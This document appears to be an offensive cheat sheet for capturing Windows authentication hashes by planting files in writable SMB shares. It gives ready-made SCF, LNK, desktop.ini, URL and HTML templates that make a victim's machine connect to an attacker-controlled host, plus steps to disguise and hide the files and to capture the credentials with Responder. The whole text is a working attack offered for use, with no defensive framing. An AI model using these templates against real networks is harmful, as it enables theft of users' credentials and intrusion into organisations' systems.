# Automatic on folder/share visit I: SCF Files
```
[Shell]
Command=2
IconFile=\\<ATTACKER_IP>\DesktopSettings.config
[Taskbar]
Command=ToggleDesktop
```
1. Put the contents into a non-suspicious file name like `@DesktopSettings.scf`
2. *If you created the file on a linux system,* use `unix2dos` to make it suitable for windows
3. Place the file in the writable SMB share (won't work if hidden)
4. Fire up responder `responder -I eth0`

# Automatic on folder/share visit II: LNK Files
```powershell
$Output_For_Lnk = "$pwd\Database.lnk"
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut($Output_For_Lnk)
$lnk.TargetPath = "\\<ATTACKER_IP>\@DB"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Database"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
1. Run the PowerShell script, it will save the `.lnk` file in the current working directory
2. Place the file in the writable SMB share (won't work if hidden)
3. Fire up responder `responder -I eth0`

# Automatic on folder/share visit III: INI Files Inside System folders
```
[.ShellClassInfo]
IconResource=\\<ATTACKER_IP>\settings
```
1. save the file with the above contents inside a `desktop.ini` file
2. connect to the writable SMB share using `smbclient`
3. create a folder and give it a non-suspicious name using `mkdir`
4. set the folder attribute to be a system folder using `setmode <FOLDER> +s`
5. change int the new folder
6. upload the `desktop.ini` file `put <INI_FILE>`
7. make it a system file using `setmode <INI_FILE> +s`
8. and make it hidden using `setmode <INI_FILE> +h`
9. *overall,* it should like this:
```
smb: \> mkdir <FOLDER>
smb: \> setmode <FOLDER> +s
smb: \> cd <FOLDER>
smb: \> put <INI_FILE>
smb: \> setmode <INI_FILE> +s
smb: \> setmode <INI_FILE> +h
```
10. fire up responder `responder -I eth0`

# Works when *Selected*: URL files
```
[InternetShortcut]
URL=file://<ATTACKER_IP>/@IEsettings
```
1. Put the contents into a non-suspicious file name like `IESettings.url`
2. *If you created the file on a linux system,* use `unix2dos` to make it suitable for windows
3. Place the file in the writable SMB share (won't work if hidden)
4. Fire up responder `responder -I eth0`

# Must be opened to work: HTML files (tested on IE & Chrome)
```
<img src="\\\\<ATTACKER_IP>\\img">
```
1. Put the contents into a non-suspicious file name like `bookmarks.html`
2. *If you created the file on a linux system,* use `unix2dos` to make it suitable for windows
3. Place the file in the writable SMB share (won't work if hidden)
4. Fire up responder `responder -I eth0`

### Note
- you can hide any file when in an `smbclient` prompt using `setmode <FILE_NAM> +h`
- you can unhide any file when in an `smbclient` prompt using `setmode <FILE_NAM> -h`